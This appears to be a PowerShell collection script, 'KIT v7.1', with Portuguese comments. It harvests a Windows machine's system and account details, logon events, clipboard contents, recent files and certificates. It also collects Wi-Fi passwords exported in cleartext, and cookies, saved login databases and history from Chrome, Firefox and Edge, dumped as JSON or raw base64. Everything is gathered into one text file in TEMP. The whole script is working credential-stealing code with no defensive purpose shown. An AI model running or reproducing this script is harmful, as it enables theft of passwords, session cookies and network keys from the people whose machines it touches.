# KIT v7.1  –  tudo em texto puro
$out = "$env:TEMP\kit.txt"
"" | Set-Content $out                        # limpa/arquivo novo

# ---------- 1) Informações do sistema ----------
@"
=== SYSTEMINFO ===
$(systeminfo)
=== WIN32_ComputerSystem ===
$(Get-CimInstance Win32_ComputerSystem | ConvertTo-Json -Compress)
=== WIN32_Processor ===
$(Get-CimInstance Win32_Processor | ConvertTo-Json -Compress)
=== WIN32_BIOS ===
$(Get-CimInstance Win32_BIOS | ConvertTo-Json -Compress)
=== IP CONFIG ===
$(Get-NetIPConfiguration | ConvertTo-Json -Compress)
=== USERS ===
$(Get-CimInstance Win32_UserAccount | ConvertTo-Json -Compress)
=== ADMIN GROUP ===
$(net localgroup administradores)
===  ÚLTIMOS 100 LOGONS (4624) ===
$((Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0) |
    Select TimeCreated,Id,LevelDisplayName,Message | ConvertTo-Json -Compress)
=== CLIPBOARD ===
$(Get-Clipboard -Raw -EA 0)
=== ARQUIVOS RECENTES ===
$(Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -File -EA 0 |
    Select Name,LastWriteTime,Length | ConvertTo-Json -Compress)
=== CERTIFICADOS USER ===
$(Get-ChildItem Cert:\CurrentUser\My -EA 0 |
    Select Subject,Thumbprint,NotAfter | ConvertTo-Json -Compress)
"@ | Add-Content $out

# ---------- 2) Perfis Wi-Fi (XML já é texto) ----------
try {
    netsh wlan export profile key=clear folder="$env:TEMP" | Out-Null
    Get-ChildItem "$env:TEMP" -Filter *.xml -EA 0 | %{
        "`n=== WI-FI: $($_.Name) ===`n" | Add-Content $out
        Get-Content $_ -Raw | Add-Content $out
        Remove-Item $_
    }
}catch{}

# ---------- 3) Cookies / Logins dos navegadores ----------
@(
    @{Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default";Files=@('Cookies','Login Data','History')},
    @{Path="$env:APPDATA\Mozilla\Firefox\Profiles";Files=@('cookies.sqlite','logins.json','places.sqlite')},
    @{Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default";Files=@('Cookies','Login Data','History')}
) | %{
    $base = $_.Path
    $_.Files | %{
        $f = Get-ChildItem $base -Recurse -File -Name $_ -EA 0 | Select -First 1
        if($f){
            $full = Join-Path $base $f
            "`n=== NAVEGADOR: $full ===`n" | Add-Content $out
            # se for SQLite, exporta como JSON simples
            if($full -match '\.(sqlite|db)$'){
                try{
                    Add-Type -Path "$env:PROGRAMFILES\System.Data.SQLite\System.Data.SQLite.dll" -EA Stop
                    $cnn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$full;Read Only=True"
                    $cnn.Open()
                    $dt = New-Object System.Data.DataTable
                    (New-Object System.Data.SQLite.SQLiteDataAdapter "SELECT * FROM cookies LIMIT 50",$cnn).Fill($dt) | Out-Null
                    $cnn.Close()
                    $dt | ConvertTo-Json -Compress | Add-Content $out
                }catch{
                    "# SQLite locked ou driver ausente – copiando raw bytes (base64) #" | Add-Content $out
                    [Convert]::ToBase64String([IO.File]::ReadAllBytes($full)) | Add-Content $out
                }
            }else{
                Get-Content $full -Raw -EA 0 | Add-Content $out
            }
        }
    }
}

# ---------- 4) Entrega ----------
Write-Host "Kit salvo em:  $out" -Fore Green
Invoke-Item $out      # abre no notepad
